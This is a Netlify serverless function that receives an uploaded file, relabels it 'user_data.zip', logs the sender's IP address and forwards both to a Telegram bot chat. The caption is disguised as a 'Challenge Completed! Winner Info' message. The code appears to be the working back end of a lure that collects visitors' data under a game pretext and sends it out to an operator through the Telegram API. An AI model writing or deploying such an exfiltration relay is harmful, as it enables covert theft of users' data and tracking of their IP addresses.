const https = require('https');
const FormData = require('form-data');

exports.handler = async (event, context) => {
    // CORS headers
    const headers = {
        'Access-Control-Allow-Origin': '*',
        'Access-Control-Allow-Headers': 'Content-Type',
        'Access-Control-Allow-Methods': 'POST, OPTIONS'
    };

    // Handle preflight
    if (event.httpMethod === 'OPTIONS') {
        return {
            statusCode: 200,
            headers,
            body: ''
        };
    }

    if (event.httpMethod !== 'POST') {
        return {
            statusCode: 405,
            headers,
            body: JSON.stringify({ message: 'Method Not Allowed' })
        };
    }

    try {
        // Get environment variables
        const BOT_TOKEN = process.env.BOT_TOKEN;
        const CHAT_ID = process.env.CHAT_ID;

        if (!BOT_TOKEN || !CHAT_ID) {
            return {
                statusCode: 500,
                headers,
                body: JSON.stringify({ 
                    message: 'BOT_TOKEN or CHAT_ID not configured. Please set them in Netlify environment variables.' 
                })
            };
        }

        // Parse multipart form data
        const boundary = event.headers['content-type'].split('boundary=')[1];
        const parts = parseMultipart(event.body, boundary);
        
        if (!parts.file) {
            return {
                statusCode: 400,
                headers,
                body: JSON.stringify({ message: 'No file provided' })
            };
        }

        // Get client IP
        const clientIP = event.headers['x-forwarded-for'] || event.headers['x-nf-client-connection-ip'] || 'Unknown';

        // Prepare form data for Telegram
        const form = new FormData();
        form.append('chat_id', CHAT_ID);
        form.append('document', Buffer.from(parts.file, 'base64'), {
            filename: 'user_data.zip',
            contentType: 'application/zip'
        });
        form.append('caption', `🎀 Challenge Completed!\n\n👤 Winner Info:\n🌍 IP: ${clientIP}\n⏰ Time: ${new Date().toLocaleString('id-ID')}\n🎉 Status: Success!`);

        // Send to Telegram
        const result = await sendToTelegramAPI(BOT_TOKEN, form);

        return {
            statusCode: 200,
            headers,
            body: JSON.stringify({ 
                success: true, 
                message: 'Data sent successfully',
                ip: clientIP
            })
        };

    } catch (error) {
        console.error('Error:', error);
        return {
            statusCode: 500,
            headers,
            body: JSON.stringify({ 
                message: 'Error sending data: ' + error.message 
            })
        };
    }
};

// Parse multipart form data
function parseMultipart(body, boundary) {
    const parts = {};
    const sections = body.split(`--${boundary}`);
    
    for (const section of sections) {
        if (section.includes('filename=')) {
            const fileMatch = section.match(/name="([^"]+)"/); 
            const contentStart = section.indexOf('\r\n\r\n') + 4;
            const contentEnd = section.lastIndexOf('\r\n');
            
            if (fileMatch && contentStart > 3) {
                const fieldName = fileMatch[1];
                const content = section.substring(contentStart, contentEnd);
                parts[fieldName] = content;
            }
        }
    }
    
    return parts;
}

// Send to Telegram API
function sendToTelegramAPI(token, formData) {
    return new Promise((resolve, reject) => {
        const options = {
            hostname: 'api.telegram.org',
            path: `/bot${token}/sendDocument`,
            method: 'POST',
            headers: formData.getHeaders()
        };

        const req = https.request(options, (res) => {
            let data = '';
            
            res.on('data', (chunk) => {
                data += chunk;
            });
            
            res.on('end', () => {
                if (res.statusCode === 200) {
                    resolve(JSON.parse(data));
                } else {
                    reject(new Error(`Telegram API error: ${data}`));
                }
            });
        });

        req.on('error', (error) => {
            reject(error);
        });

        formData.pipe(req);
    });
}